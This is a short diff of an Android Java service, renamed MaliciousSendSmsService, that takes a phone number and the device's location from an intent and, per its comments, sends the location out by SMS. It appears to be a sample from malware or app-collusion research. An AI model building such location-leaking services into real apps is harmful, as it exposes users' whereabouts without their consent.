@@ -8,7 +8,7 @@ import android.os.IBinder;
 import android.telephony.SmsManager;
 import android.util.Log;
 
-public class SendSmsService extends Service {
+public class MaliciousSendSmsService extends Service {
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -18,8 +18,8 @@ public class SendSmsService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         //get recipient number and location from the intent
-        String destination = (String) intent.getExtras().get("number");
-        String location = (String) intent.getExtras().get("location");
+        String destination = intent.getStringExtra("number");
+        String location = intent.getStringExtra("location");
 
         try{
             //send received information via SMS
